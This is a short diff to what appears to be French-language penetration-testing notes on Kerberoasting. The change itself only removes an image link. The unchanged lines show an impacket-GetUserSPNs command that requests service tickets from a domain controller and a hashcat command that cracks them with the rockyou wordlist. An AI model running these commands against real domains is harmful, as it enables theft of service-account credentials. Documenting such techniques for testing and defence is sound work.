@@ -61,8 +61,6 @@ impacket-GetUserSPNs -dc-ip $ip $domain/$user -request -outputfile output.txt
 hashcat -m 13100 '$tgs' /usr/share/wordlist/rockyou.txt
 ```
 
-![crack-ticket](../../../Files/crack-ticket.webp)
-
 ---
 
 | Catégorie                    | Information                                                                                                                                                                                                                                                                        |
